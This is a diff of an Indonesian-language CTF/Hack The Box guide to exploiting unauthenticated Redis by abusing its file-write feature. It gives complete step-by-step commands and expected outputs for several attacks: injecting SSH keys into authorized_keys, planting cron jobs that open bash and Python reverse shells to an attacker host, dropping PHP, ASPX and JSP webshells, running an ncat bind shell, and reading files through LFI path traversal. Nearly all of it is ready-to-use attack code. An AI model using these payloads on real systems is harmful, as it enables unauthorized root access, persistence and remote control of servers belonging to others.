@@ -384,260 +384,2106 @@ $ redis-cli -h 10.10.10.100 GET flag
 "HTB{redis_unauth_flag}"
 ```
 
-### FASE 4: FILE WRITE VIA REDIS (ATTACK VECTOR UTAMA)
+## FASE 4: FILE WRITE VIA REDIS (ATTACK VECTOR UTAMA)
 
-Ini adalah **serangan paling powerful** dari Redis — menulis file ke sistem!
+> **Tujuan fase ini:** Memanfaatkan kemampuan Redis untuk menulis file ke sistem. Ini adalah serangan paling powerful dari Redis karena bisa langsung mengarah ke shell tanpa exploit CVE.
 
-#### 4a. SSH Key Injection (Paling Umum di CTF)
+---
 
-```text
-📌 TUJUAN: Inject public key ke ~/.ssh/authorized_keys
-📌 HASIL: SSH login sebagai user yang menjalankan Redis
-📌 TARGET: Biasanya user 'redis' atau 'root'
+### Langkah 4.0 — Pre-Check: Tentukan User Redis & Permission
+
+> **Wajib dilakukan sebelum mencoba file write apapun.** User yang menjalankan Redis menentukan direktori mana yang bisa ditulis.
+
+Bash
+
+```
+# Method 1: Jika sudah punya akses sistem lain (webshell, LFI, dll)
+ps aux | grep redis
+# Output menunjukkan siapa yang jalankan redis-server
+
+# Method 2: Dari Redis sendiri — coba tulis ke berbagai lokasi
+# (setiap OK = direktori bisa ditulis)
+redis-cli -h $TARGET CONFIG SET dir /root/.ssh/      # Test root
+redis-cli -h $TARGET CONFIG SET dir /home/redis/.ssh/ # Test redis user
+redis-cli -h $TARGET CONFIG SET dir /var/www/html/    # Test www-data
+redis-cli -h $TARGET CONFIG SET dir /tmp/             # Test fallback
+
+# Method 3: Baca /proc/[PID]/status via LFI jika ada
+curl "http://$TARGET/page?file=../../../../proc/$(redis-cli -h $TARGET INFO server | grep process_id | cut -d: -f2 | tr -d '\r')/status"
 ```
 
-**STEP-BY-STEP SSH KEY INJECTION:**
+**OUTPUT BERHASIL ✅ — Bisa tulis ke /root/.ssh/:**
 
-```bash
-# STEP 1: Generate SSH keypair di Parrot OS
+text
+
+```
+OK
+```
+
+➡️ Redis berjalan sebagai **root** → **PATH 4A (SSH Key ke root)**
+
+**OUTPUT BERHASIL ✅ — Bisa tulis ke /home/redis/.ssh/:**
+
+text
+
+```
+OK
+```
+
+➡️ Redis berjalan sebagai **user redis** → **PATH 4A (SSH Key ke user redis)**
+
+**OUTPUT BERHASIL ✅ — Hanya bisa tulis ke /tmp/ dan /var/www/html/:**
+
+text
+
+```
+# /root/.ssh/ → Permission denied
+# /home/redis/.ssh/ → Permission denied
+# /tmp/ → OK
+# /var/www/html/ → OK
+```
+
+➡️ Redis berjalan sebagai **www-data** atau user terbatas → **PATH 4C (Webshell)**
+
+**OUTPUT GAGAL ❌ — Semua direktori permission denied:**
+
+text
+
+```
+(error) ERR: CONFIG SET dir: Permission denied
+(error) ERR: CONFIG SET dir: Permission denied
+(error) ERR: CONFIG SET dir: Permission denied
+```
+
+➡️ Redis sangat terbatas. Lanjut ke **PATH 4D (Fallback & Workaround)**
+
+---
+
+### PATH 4A — SSH Key Injection
+
+> **Tujuan:** Inject public key ke `~/.ssh/authorized_keys` → SSH login tanpa password  
+> **Hasil:** Shell sebagai user yang menjalankan Redis (redis atau root)  
+> **Kondisi:** Redis bisa write ke direktori `.ssh` user
+
+Bash
+
+```
+# STEP 1: Generate SSH keypair khusus untuk exploit ini
 ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
-# STEP 2: Lihat public key
+
+# Verifikasi keypair terbuat
+ls -la ~/.ssh/redis_exploit*
+# Harus ada:
+# ~/.ssh/redis_exploit      (private key)
+# ~/.ssh/redis_exploit.pub  (public key)
+
 cat ~/.ssh/redis_exploit.pub
-# Output: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... user@parrot
-# STEP 3: Format payload dengan newlines (WAJIB!)
-# Public key HARUS dibungkus newline agar Redis memparsing dengan benar
-echo -e "\n\n$(cat ~/.ssh/redis_exploit.pub)\n\n" > /tmp/redis_key.txt
-cat /tmp/redis_key.txt
-# STEP 4: Konek ke Redis dan inject
-redis-cli -h TARGET
-# STEP 4a: FLUSHALL (hapus data untuk output bersih)
-127.0.0.1:6379> FLUSHALL
-OK
-# STEP 4b: Set working directory ke .ssh user redis
-127.0.0.1:6379> CONFIG SET dir /home/redis/.ssh/
-OK
-# STEP 4c: Set filename ke authorized_keys
-127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
-OK
-# STEP 4d: Set key dengan public key (GANTI DENGAN PUBLIC KEY ANDA!)
-127.0.0.1:6379> SET pubkey "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... user@parrot\n\n"
-OK
-# STEP 4e: SAVE untuk menulis ke disk
-127.0.0.1:6379> SAVE
-OK
-# STEP 5: SSH login sebagai user redis
-ssh -i ~/.ssh/redis_exploit redis@TARGET
-# Atau jika Redis berjalan sebagai root:
-ssh -i ~/.ssh/redis_exploit root@TARGET
+# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot
 ```
 
-**Contoh Output Lengkap:**
+**OUTPUT BERHASIL ✅:**
 
-```text
-$ ssh-keygen -t rsa -b 4096 -f ~/.ssh/redis_exploit -N ""
+text
+
+```
 Generating public/private rsa key pair.
 Your identification has been saved in ~/.ssh/redis_exploit
 Your public key has been saved in ~/.ssh/redis_exploit.pub
-$ cat ~/.ssh/redis_exploit.pub
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot
-$ redis-cli -h 10.10.10.100
-127.0.0.1:6379> FLUSHALL
+The key fingerprint is:
+SHA256:abc123... attacker@parrot
+```
+
+Bash
+
+```
+# STEP 2: Siapkan payload dengan newlines WAJIB
+# Tanpa newlines → RDB binary format akan corrupt authorized_keys
+PUB_KEY=$(cat ~/.ssh/redis_exploit.pub)
+echo -e "\n\n$PUB_KEY\n\n" > /tmp/redis_key.txt
+
+# Verifikasi format (harus ada baris kosong di awal dan akhir)
+cat /tmp/redis_key.txt
+```
+
+**OUTPUT BERHASIL ✅ — Format dengan newlines:**
+
+text
+
+```
+                        ← baris kosong
+                        ← baris kosong  
+ssh-rsa AAAAB3NzaC1... attacker@parrot
+                        ← baris kosong
+                        ← baris kosong
+```
+
+Bash
+
+```
+# STEP 3: Tentukan target path berdasarkan user Redis
+# (dari hasil langkah 4.0)
+
+# SKENARIO A: Redis sebagai root
+export SSH_TARGET_DIR="/root/.ssh/"
+export SSH_USER="root"
+
+# SKENARIO B: Redis sebagai user redis
+export SSH_TARGET_DIR="/home/redis/.ssh/"
+export SSH_USER="redis"
+
+# SKENARIO C: Redis sebagai user lain (dari /etc/passwd)
+# Cari home directory user yang menjalankan redis:
+curl "http://$TARGET/page?file=../../../../etc/passwd" 2>/dev/null | grep redis
+# → redis:x:999:999::/var/lib/redis:/bin/bash
+export SSH_TARGET_DIR="/var/lib/redis/.ssh/"
+export SSH_USER="redis"
+```
+
+Bash
+
+```
+# STEP 4: Inject key — jalankan berurutan TANPA skip
+redis-cli -h $TARGET FLUSHALL
+# Output: OK
+# (FLUSHALL bersihkan data lama agar output RDB bersih)
+
+redis-cli -h $TARGET CONFIG SET dir $SSH_TARGET_DIR
+# Output yang diharapkan: OK
+
+redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
+# Output yang diharapkan: OK
+
+redis-cli -h $TARGET SET pubkey "\n\n$PUB_KEY\n\n"
+# Output yang diharapkan: OK
+
+redis-cli -h $TARGET SAVE
+# Output yang diharapkan: OK
+```
+
+**OUTPUT BERHASIL ✅ — Semua command OK:**
+
+text
+
+```
 OK
-127.0.0.1:6379> CONFIG SET dir /home/redis/.ssh/
 OK
-127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
 OK
-127.0.0.1:6379> SET pubkey "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot\n\n"
 OK
-127.0.0.1:6379> SAVE
 OK
-127.0.0.1:6379> exit
-$ ssh -i ~/.ssh/redis_exploit redis@10.10.10.100
-Last login: Mon Jan 20 10:00:00 2025 from 10.10.14.10
+```
+
+➡️ Key berhasil di-inject. Lanjut ke STEP 5.
+
+**OUTPUT GAGAL ❌ — CONFIG SET dir: Permission denied:**
+
+text
+
+```
+(error) ERR: CONFIG SET dir: Permission denied
+```
+
+➡️ Direktori target tidak ada atau tidak bisa ditulis. Lihat **Langkah 4.0A — Buat Direktori dulu**.
+
+**OUTPUT GAGAL ❌ — SAVE gagal:**
+
+text
+
+```
+(error) ERR: SAVE failed after redis db write
+```
+
+➡️ Cek disk space atau permission:
+
+Bash
+
+```
+# Cek dari sistem lain:
+df -h   # Disk full?
+ls -la $(dirname $SSH_TARGET_DIR)  # Permission direktori parent?
+
+# Coba BGSAVE sebagai alternatif:
+redis-cli -h $TARGET BGSAVE
+redis-cli -h $TARGET LASTSAVE  # Cek timestamp SAVE terakhir
+```
+
+Bash
+
+```
+# STEP 5: Test SSH login
+ssh -i ~/.ssh/redis_exploit \
+    -o StrictHostKeyChecking=no \
+    -o IdentitiesOnly=yes \
+    -o ConnectTimeout=10 \
+    $SSH_USER@$TARGET
+
+# Jika tidak tahu user, coba semua kemungkinan:
+for user in redis root www-data ubuntu debian; do
+    echo "[*] Trying $user..."
+    ssh -i ~/.ssh/redis_exploit \
+        -o StrictHostKeyChecking=no \
+        -o ConnectTimeout=5 \
+        "$user@$TARGET" "id" 2>/dev/null \
+    && echo "[+] SUCCESS: $user" && break
+done
+```
+
+**OUTPUT BERHASIL ✅ — SSH berhasil sebagai redis:**
+
+text
+
+```
+Last login: Mon Jan 20 10:00:00 2025
 redis@target:~$ id
 uid=999(redis) gid=999(redis) groups=999(redis)
 redis@target:~$ whoami
 redis
 ```
 
-**⚠️ TROUBLESHOOTING SSH INJECTION:**
+➡️ Dapat shell! Lanjut ke **Fase 5 Post-Exploitation / Langkah 4.0B untuk eskalasi ke root**
 
-```text
-❌ "Permission denied (publickey)" → Kemungkinan:
-   - Dir /home/redis/.ssh/ tidak ada → buat dulu
-   - Permission .ssh harus 700
-   - Redis tidak berjalan sebagai user redis (cek ps aux)
-   SOLUSI:
-   - Coba dir /var/lib/redis/.ssh/
-   - Coba dir /root/.ssh/ (jika Redis root)
-   - Buat .ssh directory via Redis file write terlebih dahulu:
-     CONFIG SET dir /home/redis/
-     CONFIG SET dbfilename .ssh
-     SET dummy ""; SAVE
-     Lalu inject key ke .ssh/authorized_keys
+**OUTPUT BERHASIL ✅ — SSH berhasil sebagai root:**
+
+text
+
+```
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@target:~# cat /root/root.txt
+HTB{redis_root_pwned}
 ```
 
-#### 4b. Cron Job Backdoor (Untuk Root Shell)
+➡️ **ROOT SHELL LANGSUNG!** Flag berhasil.
 
-```text
-📌 TUJUAN: Buat cron job yang execute reverse shell setiap menit
-📌 HASIL: Root shell (jika Redis berjalan sebagai root)
-📌 KRITIS: Redis HARUS root atau /var/spool/cron writable
+**OUTPUT GAGAL ❌ — Permission denied (publickey):**
+
+text
+
+```
+redis@10.10.11.200: Permission denied (publickey).
 ```
 
-**STEP-BY-STEP CRON BACKDOOR:**
+➡️ Beberapa kemungkinan penyebab — cek satu per satu:
 
-```bash
-# STEP 1: Setup listener di attacker
-nc -lvnp 4444
-# STEP 2: Konek ke Redis dan inject cron
-redis-cli -h TARGET
-# STEP 3: Set directory ke cron (Root user)
-127.0.0.1:6379> CONFIG SET dir /var/spool/cron/crontabs/
-OK
-# STEP 4: Set filename ke 'root'
-127.0.0.1:6379> CONFIG SET dbfilename root
-OK
-# STEP 5: Set cron payload (GANTI IP dan PORT!)
-127.0.0.1:6379> SET cron "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
-OK
-# STEP 6: SAVE
-127.0.0.1:6379> SAVE
-OK
-# STEP 7: Tunggu 1 menit, shell akan masuk
-# nc listener akan menerima koneksi
+---
+
+#### Langkah 4.0A — Buat Direktori .ssh Jika Belum Ada
+
+Bash
+
+```
+# Direktori .ssh mungkin belum ada — buat via Redis file write
+# Caranya: tulis file dummy di home directory dulu
+
+# STEP 1: Set ke home directory user redis
+redis-cli -h $TARGET CONFIG SET dir /home/redis/
+redis-cli -h $TARGET CONFIG SET dbfilename .ssh_dummy
+
+# STEP 2: Tulis file dummy (untuk "touch" direktori)
+redis-cli -h $TARGET SET dummy "placeholder"
+redis-cli -h $TARGET SAVE
+
+# Ini tidak membuat direktori, tapi bisa verifikasi akses
+# Cara lain — jika ada webshell atau RCE lain:
+# mkdir -p /home/redis/.ssh/ && chmod 700 /home/redis/.ssh/
+
+# STEP 3: Coba inject ke lokasi berbeda
+# Beberapa sistem Redis punya home di /var/lib/redis/
+redis-cli -h $TARGET CONFIG SET dir /var/lib/redis/.ssh/
+# Jika OK → gunakan path ini
 ```
 
-**Contoh Output Cron Backdoor:**
+**OUTPUT BERHASIL ✅ — Alternatif path berhasil:**
 
-```text
+text
+
+```
+OK  ← /var/lib/redis/.ssh/ bisa ditulis
+```
+
+➡️ Ulangi STEP 4 dengan path baru:
+
+Bash
+
+```
+export SSH_TARGET_DIR="/var/lib/redis/.ssh/"
+redis-cli -h $TARGET CONFIG SET dir $SSH_TARGET_DIR
+redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
+redis-cli -h $TARGET SET pubkey "\n\n$PUB_KEY\n\n"
+redis-cli -h $TARGET SAVE
+ssh -i ~/.ssh/redis_exploit redis@$TARGET
+```
+
+---
+
+#### Langkah 4.0B — Troubleshoot SSH Permission Denied
+
+Bash
+
+```
+# Penyebab 1: StrictModes di sshd_config
+# SSH menolak authorized_keys jika permission tidak tepat
+# Solusi: Tidak bisa fix langsung via Redis, butuh akses lain
+
+# Penyebab 2: Public key format salah karena RDB binary
+# Verifikasi isi authorized_keys yang ter-generate:
+# (butuh akses ke sistem — via LFI atau path lain)
+curl "http://$TARGET/page?file=../../../../home/redis/.ssh/authorized_keys"
+
+# Jika isinya binary/corrupt → format payload perlu diperbaiki
+# Coba cara ini:
+redis-cli -h $TARGET FLUSHALL
+redis-cli -h $TARGET CONFIG SET dir /home/redis/.ssh/
+redis-cli -h $TARGET CONFIG SET dbfilename authorized_keys
+
+# Set dengan ekstra newlines yang lebih banyak
+redis-cli -h $TARGET SET pubkey $'\n\n\n\n'"$PUB_KEY"$'\n\n\n\n'
+redis-cli -h $TARGET SAVE
+
+# Penyebab 3: Key sudah ada tapi FLUSHALL tidak dijalankan
+# RDB format dengan data lain bisa corrupt authorized_keys
+# Pastikan FLUSHALL dijalankan PERTAMA sebelum set key
+
+# Penyebab 4: SSH tidak ada di target
+nmap -p 22 $TARGET
+# Jika port 22 closed → target tidak ada SSH service
+# → Switch ke PATH 4B (Cron) atau PATH 4C (Webshell)
+```
+
+**OUTPUT BERHASIL ✅ — Verifikasi isi authorized_keys via LFI:**
+
+text
+
+```
+REDIS0009ý	redis-ver6.0.16ý
+úredis-bits@ýùÂÊ  ÂX‡ pubkey
+
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@parrot
+
+
+ÿÝ÷Ñ
+```
+
+➡️ Ada binary REDIS header sebelum public key — ini **normal**. SSH biasanya masih bisa parse-nya. Jika tetap gagal → coba metode lain.
+
+**OUTPUT BERHASIL ✅ — Masalah StrictModes:**
+
+text
+
+```
+# Di /etc/ssh/sshd_config:
+StrictModes yes
+```
+
+➡️ Dengan StrictModes yes, `.ssh/` harus chmod 700 dan `authorized_keys` chmod 600.  
+Tidak bisa fix via Redis saja. Butuh akses lain (cron/webshell dulu):
+
+Bash
+
+```
+# Dari webshell atau cron shell yang sudah ada:
+chmod 700 /home/redis/.ssh/
+chmod 600 /home/redis/.ssh/authorized_keys
+# Lalu retry SSH
+```
+
+---
+
+### PATH 4B — Cron Job Backdoor
+
+> **Tujuan:** Buat cron job yang execute reverse shell  
+> **Hasil:** Root shell (jika Redis berjalan sebagai root)  
+> **Kondisi:** Redis bisa write ke `/var/spool/cron/crontabs/` atau `/etc/cron.d/`
+
+Bash
+
+```
+# STEP 1: Identifikasi OS dan lokasi cron yang benar
+# (Debian/Ubuntu vs CentOS/RHEL punya path berbeda)
+
+# Test akses ke berbagai cron directory
+for crondir in \
+    "/var/spool/cron/crontabs/" \
+    "/var/spool/cron/" \
+    "/etc/cron.d/" \
+    "/etc/cron.hourly/" \
+    "/etc/cron.daily/"; do
+    result=$(redis-cli -h $TARGET CONFIG SET dir "$crondir" 2>/dev/null)
+    echo "[$result] $crondir"
+done
+```
+
+**OUTPUT BERHASIL ✅ — Identifikasi cron directory yang writable:**
+
+text
+
+```
+[OK]    /var/spool/cron/crontabs/   ← Debian/Ubuntu format
+[(error) ERR: Permission denied] /var/spool/cron/
+[OK]    /etc/cron.d/                ← Format berbeda, perlu "root" field
+```
+
+Bash
+
+```
+# STEP 2: Setup listener di terminal terpisah DULU
+# (buka terminal baru sebelum lanjut)
+nc -lvnp $LPORT
+
+# STEP 3: Pilih format payload berdasarkan cron directory
+
+# FORMAT A: Untuk /var/spool/cron/crontabs/ (Debian/Ubuntu)
+# File = "root" (nama user), tidak perlu field user di cron
+redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/crontabs/
+redis-cli -h $TARGET CONFIG SET dbfilename root
+redis-cli -h $TARGET SET cron "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\n\n"
+redis-cli -h $TARGET SAVE
+
+# FORMAT B: Untuk /etc/cron.d/ (semua distro)
+# File bisa nama apa saja, tapi HARUS ada field "root" di payload
+redis-cli -h $TARGET CONFIG SET dir /etc/cron.d/
+redis-cli -h $TARGET CONFIG SET dbfilename redis_pwn
+redis-cli -h $TARGET SET cron "\n\n* * * * * root bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\n\n"
+redis-cli -h $TARGET SAVE
+
+# STEP 4: Tunggu maksimal 1 menit
+echo "[*] Payload injected! Menunggu cron execute (max 60 detik)..."
+sleep 65
+```
+
+**OUTPUT BERHASIL ✅ — Shell masuk ke listener:**
+
+text
+
+```
 $ nc -lvnp 4444
 Listening on 0.0.0.0 4444
-Connection received on 10.10.10.100 54321
+Connection received on 10.10.11.200 45123
 bash: cannot set terminal process group (1234): Inappropriate ioctl for device
 bash: no job control in this shell
 root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
 root@target:~# whoami
 root
-root@target:~# hostname
-target
 ```
 
-**Alternatif Cron Payload:**
+➡️ **ROOT SHELL!** Upgrade:
 
-```bash
-# Untuk Debian/Ubuntu (format berbeda)
-# Coba dir: /etc/cron.d/
-CONFIG SET dir /etc/cron.d/
-CONFIG SET dbfilename redis_backdoor
-# Payload dengan shebang
-SET cron "\n\n* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
-# Payload reverse shell Python (lebih reliable)
-SET cron "\n\n* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"
+Bash
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
 ```
 
-#### 4c. Webshell Drop
+**OUTPUT GAGAL ❌ — Shell tidak masuk setelah 3 menit:**
 
-```text
-📌 TUJUAN: Drop PHP webshell di web directory
-📌 HASIL: Web shell untuk RCE
-📌 TARGET: /var/www/html/ atau web root lainnya
+text
+
+```
+(tidak ada koneksi ke listener)
 ```
 
-**STEP-BY-STEP WEBSHELL DROP:**
+➡️ Troubleshoot step by step:
 
-```bash
-redis-cli -h TARGET
-# Cari web root (biasanya /var/www/html/)
-127.0.0.1:6379> CONFIG SET dir /var/www/html/
+---
+
+#### Langkah 4B.1 — Troubleshoot Cron Tidak Execute
+
+Bash
+
+```
+# CEK 1: Verifikasi cron file berhasil dibuat (via LFI atau akses lain)
+curl "http://$TARGET/page?file=../../../../var/spool/cron/crontabs/root" 2>/dev/null
+# Harus ada reverse shell command di output
+
+# CEK 2: Pastikan format cron benar — cek dengan berbagai variasi
+# Variasi payload yang lebih compatible:
+redis-cli -h $TARGET SET cron "\n\n* * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\n\n"
+redis-cli -h $TARGET SAVE
+
+# CEK 3: Cron service mungkin tidak berjalan
+# Cek dari akses lain:
+ps aux | grep cron
+systemctl status cron 2>/dev/null || systemctl status crond 2>/dev/null
+
+# CEK 4: Firewall outbound blocking reverse shell
+# Coba bind shell sebagai alternatif (tidak butuh outbound):
+redis-cli -h $TARGET SET cron "\n\n* * * * * root ncat -lvnp 5555 -e /bin/bash\n\n"
+redis-cli -h $TARGET SAVE
+# Dari attacker:
+nc $TARGET 5555
+
+# CEK 5: Coba payload Python (lebih reliable di beberapa sistem):
+redis-cli -h $TARGET SET cron "\n\n* * * * * root python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n"
+redis-cli -h $TARGET SAVE
+
+# CEK 6: CentOS/RHEL path berbeda — coba /var/spool/cron/ (tanpa crontabs/)
+redis-cli -h $TARGET CONFIG SET dir /var/spool/cron/
+redis-cli -h $TARGET CONFIG SET dbfilename root
+redis-cli -h $TARGET SET cron "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\n\n"
+redis-cli -h $TARGET SAVE
+```
+
+**OUTPUT BERHASIL ✅ — Bind shell berhasil:**
+
+text
+
+```
+$ nc $TARGET 5555
+root@target:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**OUTPUT GAGAL ❌ — Semua cron path gagal, Redis bukan root:**
+
+text
+
+```
+ps aux | grep redis
+# redis 1234 0.1 0.5 /usr/bin/redis-server *:6379
+# ↑ Berjalan sebagai user "redis" bukan "root"
+# Cron di /var/spool/cron/crontabs/root tidak akan dieksekusi
+```
+
+➡️ Redis tidak running sebagai root. Cron backdoor tidak efektif.  
+➡️ Pindah ke **PATH 4C (Webshell)** atau **PATH 4E (ld.so.preload)** jika ada web server.
+
+---
+
+### PATH 4C — Webshell Drop
+
+> **Tujuan:** Drop PHP webshell di web directory → RCE sebagai www-data  
+> **Kondisi:** Ada web server aktif dan Redis bisa write ke web root
+
+Bash
+
+```
+# STEP 1: Identifikasi web server aktif
+nmap -p 80,443,8080,8443,8000,3000 $TARGET --open
+
+# STEP 2: Temukan web root yang bisa ditulis
+WEBROOT_CANDIDATES=(
+    "/var/www/html/"
+    "/var/www/html/uploads/"
+    "/var/www/html/images/"
+    "/var/www/"
+    "/usr/share/nginx/html/"
+    "/srv/http/"
+    "/opt/lampp/htdocs/"
+    "/var/www/html/wp-content/uploads/"  # WordPress
+    "/var/www/html/sites/default/files/"  # Drupal
+)
+
+for path in "${WEBROOT_CANDIDATES[@]}"; do
+    result=$(redis-cli -h $TARGET CONFIG SET dir "$path" 2>/dev/null)
+    if [ "$result" == "OK" ]; then
+        echo "[+] WRITABLE WEB PATH: $path"
+    fi
+done
+```
+
+**OUTPUT BERHASIL ✅ — Web root writable ditemukan:**
+
+text
+
+```
+[+] WRITABLE WEB PATH: /var/www/html/
+[+] WRITABLE WEB PATH: /var/www/html/uploads/
+```
+
+Bash
+
+```
+# STEP 3: Drop webshell
+redis-cli -h $TARGET CONFIG SET dir /var/www/html/
+redis-cli -h $TARGET CONFIG SET dbfilename shell.php
+redis-cli -h $TARGET SET webshell \
+    "<?php if(isset(\$_REQUEST['cmd'])){ echo '<pre>'.htmlspecialchars(shell_exec(\$_REQUEST['cmd'])).'</pre>'; } ?>"
+redis-cli -h $TARGET SAVE
+
+# STEP 4: Test webshell
+curl -s "http://$TARGET/shell.php?cmd=id"
+curl -s "http://$TARGET/shell.php?cmd=whoami"
+curl -s "http://$TARGET/shell.php?cmd=hostname"
+```
+
+**OUTPUT BERHASIL ✅ — Webshell accessible:**
+
+text
+
+```
+<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</pre>
+```
+
+➡️ Dapat RCE! Upgrade ke reverse shell:
+
+Bash
+
+```
+# Setup listener
+nc -lvnp $LPORT &
+
+# Trigger reverse shell via webshell
+curl -G "http://$TARGET/shell.php" \
+    --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
+```
+
+**OUTPUT GAGAL ❌ — HTTP 404 setelah webshell di-drop:**
+
+text
+
+```
+<!DOCTYPE HTML>
+<title>404 Not Found</title>
+```
+
+➡️ File ada tapi bukan di web root yang benar. Coba identifikasi:
+
+Bash
+
+```
+# Cek port web dan path dari nmap
+nmap -p 80 --script http-enum $TARGET
+
+# Cek apakah ada virtual host atau subdomain
+curl -H "Host: $TARGET" "http://$TARGET/shell.php?cmd=id"
+
+# Coba akses dengan path berbeda
+curl "http://$TARGET/uploads/shell.php?cmd=id"
+curl "http://$TARGET/images/shell.php?cmd=id"
+```
+
+**OUTPUT GAGAL ❌ — HTTP 200 tapi output kosong:**
+
+text
+
+```
+(response kosong atau hanya HTML template)
+```
+
+➡️ PHP mungkin tidak terinstall atau file extension tidak dieksekusi:
+
+Bash
+
+```
+# Cek PHP tersedia:
+curl "http://$TARGET/shell.php?cmd=phpinfo()" | grep -i "PHP Version"
+
+# Target mungkin Apache dengan mod_php disabled
+# Coba cara lain:
+
+# Opsi 1: Coba .phtml atau .php5
+redis-cli -h $TARGET CONFIG SET dbfilename shell.phtml
+redis-cli -h $TARGET SET webshell "<?php system(\$_GET['cmd']); ?>"
+redis-cli -h $TARGET SAVE
+curl "http://$TARGET/shell.phtml?cmd=id"
+
+# Opsi 2: Target pakai Nginx + PHP-FPM — nama file harus .php
+# (biasanya sudah .php, tetap tidak jalan → PHP-FPM config issue)
+# Google: "nginx php-fpm 200 empty response"
+
+# Opsi 3: Target pakai server lain (Python, Node.js, Ruby)
+# Cek response header:
+curl -I "http://$TARGET/"
+# X-Powered-By: Express → Node.js
+# X-Powered-By: PHP → PHP
+# Server: gunicorn → Python
+```
+
+---
+
+#### Langkah 4C.1 — Webshell untuk Non-PHP Target
+
+Bash
+
+```
+# Target Node.js/Express:
+redis-cli -h $TARGET CONFIG SET dbfilename shell.js
+redis-cli -h $TARGET SET webshell \
+    "require('child_process').exec(require('url').parse(require('http').createServer().listen().address()).query.cmd, (e,o)=>res.end(o))"
+# (Lebih complex, perlu tahu framework-nya)
+
+# Target ASP.NET (Windows IIS):
+redis-cli -h $TARGET CONFIG SET dbfilename shell.aspx
+redis-cli -h $TARGET SET webshell \
+    "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process p=new System.Diagnostics.Process();p.StartInfo.FileName=\"cmd.exe\";p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"];p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %>"
+redis-cli -h $TARGET SAVE
+curl "http://$TARGET/shell.aspx?cmd=whoami"
+
+# Target JSP (Tomcat):
+redis-cli -h $TARGET CONFIG SET dir /var/lib/tomcat/webapps/ROOT/
+redis-cli -h $TARGET CONFIG SET dbfilename shell.jsp
+redis-cli -h $TARGET SET webshell \
+    "<%@ page import=\"java.io.*\" %><% String cmd=request.getParameter(\"cmd\");Process p=Runtime.getRuntime().exec(cmd);BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String line;while((line=br.readLine())!=null)out.println(line); %>"
+redis-cli -h $TARGET SAVE
+curl "http://$TARGET/shell.jsp?cmd=id"
+```
+
+---
+
+### PATH 4D — Fallback: Write ke /tmp/ + Trigger Execution
+
+> **Kondisi:** Redis sangat terbatas, hanya bisa write ke `/tmp/` atau sejenisnya.  
+> **Strategi:** Tulis script/payload ke `/tmp/`, cari cara trigger execution via service lain.
+
+Bash
+
+```
+# STEP 1: Konfirmasi bisa write ke /tmp/
+redis-cli -h $TARGET CONFIG SET dir /tmp/
+redis-cli -h $TARGET CONFIG SET dbfilename test_write.sh
+redis-cli -h $TARGET SET testpayload "#!/bin/bash\nid > /tmp/rce_test.txt"
+redis-cli -h $TARGET SAVE
+```
+
+**OUTPUT BERHASIL ✅ — Write ke /tmp/ berhasil:**
+
+text
+
+```
 OK
-127.0.0.1:6379> CONFIG SET dbfilename shell.php
 OK
-# Webshell sederhana
-127.0.0.1:6379> SET webshell "<?php system($_GET['cmd']); ?>"
 OK
-127.0.0.1:6379> SAVE
 OK
-# Access webshell
-curl http://TARGET/shell.php?cmd=id
-# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-**Webshell Variations:**
+Bash
 
-```bash
-# More powerful webshell
-SET webshell "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?>"
-# One-liner reverse shell via webshell
-curl "http://TARGET/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+```
+# STEP 2: Identifikasi cara trigger eksekusi file di /tmp/
+
+# Cara A: Cek apakah ada cron yang eksekusi script dari /tmp/ (jarang tapi ada)
+# Cara B: Cek apakah ada service yang baca dari /tmp/
+# Cara C: Cek apakah ada SUID binary yang bisa dimanfaatkan
